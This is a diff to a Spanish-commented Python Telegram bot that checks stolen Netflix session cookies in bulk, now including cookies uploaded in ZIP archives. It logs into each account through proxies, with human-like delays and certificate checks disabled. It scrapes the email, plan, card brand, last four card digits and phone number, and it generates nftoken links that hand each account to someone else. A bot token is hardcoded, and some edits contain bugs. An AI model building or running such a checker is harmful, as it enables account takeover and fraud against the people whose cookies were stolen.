@@ -3,6 +3,8 @@ import json
 import time
 import os
 import threading
+import zipfile
+import io
 import requests
 import urllib3
 import urllib.parse
@@ -12,15 +14,17 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 import logging
 from logging.handlers import RotatingFileHandler
+import asyncio
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # --- CONFIGURACIÓN BÁSICA ---
-BOT_TOKEN = "9224399752:AAHWpHvkUUF8KdZe8h30jAkpDuMhZEvG9AQ"
+# MEJORA: Cargar token desde variable de entorno si existe, sino usar el default
+BOT_TOKEN = os.getenv("BOT_TOKEN", "9224399752:AAHWpHvkUUF8KdZe8h30jAkpDuMhZEvG9AQ")
 DEVELOPER = "AXEL MOLINA"
-VERSION = "3.0.0" # Versión actualizada con proxies y humanización
+VERSION = "3.1.0" # Actualizada
 
-# 🔒 IDs de ADMINS (Solo ellos ven /stats y /logs)
+# 🔒 IDs de ADMINS
 ADMIN_IDS = [8917082484]
 
 os.makedirs("logs", exist_ok=True)
@@ -29,7 +33,7 @@ os.makedirs("hits", exist_ok=True)
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[RotatingFileHandler("logs/bot.log", maxBytes=10*1024*1024, backupCount=5, encoding='utf-8'), logging.StreamHandler()])
 logger = logging.getLogger(__name__)
 
-# 🛡️ Palabras bloqueadas (SPAM)
+# 🛡️ Palabras bloqueadas
 SPAM_WORDS = ['luckybear', 'казино', 'casino', 'bond', 'wndpr', 'lucky', 'bear', 'ставки', 'ставка', 'играть', 'выигрыш', 'приз', 'бонус', 't.me/', 'https://t.me/', 'https://wndpr', 'https://bond']
 
 UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
@@ -91,6 +95,21 @@ def load_cookies(text):
             if k: cookies[k] = v
     return cookies
 
+def extract_text_from_file(file_bytes, filename):
+    """MEJORA: Función para extraer texto real de ZIPs o TXT"""
+    if filename.lower().endswith('.zip'):
+        try:
+            with zipfile.ZipFile(io.BytesIO(file_bytes)) as z:
+                # Tomamos el primer archivo .txt o .log que encontremos
+                for name in z.namelist():
+                    if name.endswith(('.txt', '.log')):
+                        return z.read(name).decode('utf-8', errors='ignore')
+                # Si no hay txt, devolvemos todo el contenido crudo
+                return z.read(z.namelist()[0]).decode('utf-8', errors='ignore')
+        except Exception:
+            return None
+    return file_bytes.decode('utf-8', errors='ignore')
+
 _IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 _IOS_PARAMS = {"appVersion":"15.48.1","config":'{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","billboardEnabled":"true","sharksEnabled":"true","useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}',"device_type":"NFAPPL-02-","esn":"NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200","idiom":"phone","iosVersion":"15.8.5","isTablet":"false","languages":"en-US","locale":"en-US","maxDeviceWidth":"375","model":"saget","modelType":"IPHONE8-1","odpAware":"true","path":'["account","token","default"]',"pathFormat":"graph","pixelDensity":"2.0","progressive":"false","responseFormat":"json"}
 _IOS_HEADERS = {"User-Agent":"Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)","x-netflix.request.attempt":"1","x-netflix.request.client.user.guid":"A4CS633D7VCBPE2GPK2HL4EKOE","x-netflix.context.profile-guid":"A4CS633D7VCBPE2GPK2HL4EKOE","x-netflix.request.routing":'{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',"x-netflix.context.app-version":"15.48.1","x-netflix.argo.translated":"true","x-netflix.context.form-factor":"phone","x-netflix.context.sdk-version":"2012.4","x-netflix.client.appversion":"15.48.1","x-netflix.context.max-device-width":"375","x-netflix.context.ab-tests":"","x-netflix.tracing.cl.useractionid":"4DC655F2-9C3C-4343-8229-CA1B003C3053","x-netflix.client.type":"argo","x-netflix.client.ftl.esn":"NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200","x-netflix.context.locales":"en-US","x-netflix.context.top-level-uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3","x-netflix.client.iosversion":"15.8.5","accept-language":"en-US;q=1","x-netflix.argo.abtests":"","x-netflix.context.os-version":"15.8.5","x-netflix.request.client.context":'{"appState":"foreground"}',"x-netflix.context.ui-flavor":"argo","x-netflix.argo.nfnsm":"9","x-netflix.context.pixel-density":"2.0","x-netflix.request.toplevel.uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3","x-netflix.request.client.timezoneid":"Asia/Dhaka"}
@@ -124,24 +143,24 @@ def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
 
 def check_account(cookies: dict, proxy=None, timeout=20):
     if not any(cookies.get(k) for k in ["NetflixId","SecureNetflixId"]): return None
-    
+
     # Simulación de humano: Pequeña pausa antes de conectar
-    time.sleep(1.5 + (time.time() % 2)) 
-    
+    time.sleep(1.5 + (time.time() % 2))
+
     sess = requests.Session()
     sess.headers.update({"User-Agent":UA_WEB,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":"en-US,en;q=0.9","DNT":"1"})
     for k, v in cookies.items(): sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
     if proxy: sess.proxies, sess.verify = {"http":proxy,"https":proxy}, False
-    
-    try: 
-        r = sess.get("https://www.netflix.com/account", allow_redirects=True, timeout=timeout)
+
+    try:
+        r = sess.get("https://www.netflix.com/account", allow_redirect=True, timeout=timeout)
     except: return None
-        
+
     if "login" in r.url.lower() or r.status_code in (401,403): return None
     html = r.text
-    
+
     if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None
-    
+
     email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
     name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html))
     if not name: name = _djs(_rx(r'"firstName":"([^"]+)"', html))
@@ -155,12 +174,12 @@ def check_account(cookies: dict, proxy=None, timeout=20):
     plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
     plan_id = _rx(r'"planId":\{"fieldType":"String","value":"([^"]+)"\}', html)
     price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))
-    q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html).upper()
+    q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}'.upper(), html)
     quality_map = {"UHD":"UHD 4K","FHD":"FHD 1080p","HD":"HD 720p","SD":"SD 480p"}
     quality = quality_map.get(q_raw, q_raw or "N/A")
     streams = _rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html, "N/A")
     nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))
-    
+
     _pm_start = html.find('"paymentMethods"')
     pm_raw = html[_pm_start:_pm_start+3000] if _pm_start>=0 else ""
     card_brand = _rx(r'"paymentOptionLogo":"([^"]+)"', pm_raw)
@@ -175,27 +194,27 @@ def check_account(cookies: dict, proxy=None, timeout=20):
     extra_slots = int(extra_raw) if extra_raw.isdigit() else 0
     can_change = '"canChangePlan":{"fieldType":"Boolean","value":true}' in html
     free_trial = '"isInFreeTrial":true' in html
-    
+
     profiles = [_djs(p) for p in _rx_all(r'"profileName":"([^"]+)"', html)]
     if not profiles: profiles = [_djs(p) for p in _rx_all(r'"profileName":\{"fieldType":"String","value":"([^"]+)"\}', html)]
     seen = set()
     profiles_clean = []
     for p in profiles:
         if p and p not in seen: seen.add(p); profiles_clean.append(p)
-        
+
     user_guid = _rx(r'"userGuid":"([^"]+)"', html)
     netflix_id_raw = cookies.get("NetflixId","")
     tok = generate_nftoken(netflix_id_raw, timeout, proxy=proxy) if netflix_id_raw else None
-    
+
     if tok:
         tok_safe = urllib.parse.quote(tok, safe="")
         login_pc = f"https://netflix.com/?nftoken={tok_safe}"
         login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
     else: login_pc, login_phone = "N/A", "N/A"
-        
+
     login_tv = "https://www.netflix.com/tv2"
     display_name = name or (profiles_clean[0] if profiles_clean else "N/A")
-    
+
     return {"email":email or "N/A","name":display_name,"country_code":cc,"country":_country(cc),"plan":plan or "N/A","plan_id":plan_id or "N/A","price":price or "N/A","member_since":since or "N/A","next_billing":nextbill or "N/A","free_trial":free_trial,"can_change":can_change,"video_quality":quality,"max_streams":str(streams),"extra_slots":extra_slots,"card_brand":card_brand or "N/A","card_last4":card_last4 or "N/A","payment_method":pay_type or "N/A","phone":phone,"phone_verified":phone_verified,"profiles":profiles_clean,"profile_count":len(profiles_clean),"user_guid":user_guid or "N/A","netflix_id_raw":netflix_id_raw,"login_pc":login_pc,"login_phone":login_phone,"login_tv":login_tv}
 
 class NetflixChecker:
@@ -263,28 +282,28 @@ class NetflixCheckerBot:
     def __init__(self, token):
         self.token = token
         self.app = Application.builder().token(token).build()
-        
+
         # Cargar proxies desde archivo
         proxy_list = []
         if os.path.exists("proxies.txt"):
             with open("proxies.txt", "r", encoding="utf-8") as f:
                 proxy_list = [line.strip() for line in f if line.strip()]
-        
+
         self.checker = NetflixChecker(threads=5, proxy_list=proxy_list)
         self.user_sessions = {}
-        
+
         self.app.add_handler(CommandHandler("start", self.start_command))
         self.app.add_handler(CommandHandler("help", self.help_command))
         self.app.add_handler(CommandHandler("stats", self.stats_command))
         self.app.add_handler(CommandHandler("logs", self.logs_command))
         self.app.add_handler(CommandHandler("done", self.done_command))
         self.app.add_handler(CommandHandler("cancel", self.cancel_command))
-        
+
         # Manejador de texto normal
         self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
-        
+
         # Manejador de Documentos (.zip, .txt)
-        self.app.add_handler(MessageHandler(filters.Document.PDF | filters.Document.DOC | filters.Document.TXT | filters.Document.DOCX, self.handle_document))
+        self.app.add_handler(MessageHandler(filters.Document.PDF | filters.Document.DOC | filters.Document.TXT | filters.Document.DOCX | filters.Document.FILE, self.handle_document))
 
     def is_admin(self, user_id):
         return user_id in ADMIN_IDS
@@ -292,7 +311,7 @@ class NetflixCheckerBot:
     async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
         logger.info(f"User {user.id} (@{user.username}) started bot")
-        
+
         buttons = [
             [InlineKeyboardButton("/start", callback_data="start"), InlineKeyboardButton("/help", callback_data="help")],
             [InlineKeyboardButton("/done", callback_data="done"), InlineKeyboardButton("/cancel", callback_data="cancel")]
@@ -395,20 +414,28 @@ class NetflixCheckerBot:
         doc = update.message.document
         file_obj = await context.bot.get_file(doc.file_id)
         content = await file_obj.download_as_bytearray()
-        text_content = content.decode('utf-8', errors='ignore')
         
-        # Si es zip, se podría descomprimir aquí, pero por simplicidad lo tratamos como texto si el formato es claro
-        # Para un zip real, necesitaríamos importar zipfile. Aquí asumimos que el usuario sube un .txt directo o un zip con un solo .txt.
+        # MEJORA: Extraer texto real del archivo (soporta ZIP)
+        text_content = extract_text_from_file(content, doc.file_name or "")
         
+        if not text_content:
+             await update.message.reply_text("❌ Formato no reconocido o ZIP corrupto.")
+             return
+
         await update.message.reply_text("📂 Procesando archivo...")
-        cookies = load_cookies(text_content)
-        if cookies:
-            await update.message.reply_text("✅ Archivo leído correctamente. Use /done para verificar.")
-            user_id = update.effective_user.id
-            if user_id not in self.user_sessions: self.user_sessions[user_id] = []
-            self.user_sessions[user_id].append(text_content)
-        else:
-            await update.message.reply_text("❌ Formato no reconocido en el archivo.")
+        # Dividimos por líneas para procesar cada cookie individualmente
+        lines = [line.strip() for line in text_content.split('\n') if line.strip()]
+        
+        if not lines:
+            await update.message.reply_text("❌ Archivo vacío.")
+            return
+
+        await update.message.reply_text(f"✅ Archivo leído correctamente. {len(lines)} líneas encontradas. Use /done para verificar.")
+        user_id = update.effective_user.id
+        if user_id not in self.user_sessions: self.user_sessions[user_id] = []
+        
+        # Añadimos cada línea como una cookie independiente
+        self.user_sessions[user_id].extend(lines)
 
     async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
@@ -493,15 +520,8 @@ class NetflixCheckerBot:
         logger.info(f"Bot iniciado - Dev: {DEVELOPER} - ANTISPAM ACTIVO - ADMIN PROTEGIDO - PROXIES ACTIVOS")
         self.app.run_polling()
 
-import asyncio
-
 if __name__ == "__main__":
-    # Crear explícitamente el event loop para Python 3.14+
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-    except Exception:
-        pass
-    
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
     bot = NetflixCheckerBot(BOT_TOKEN)
     bot.run()
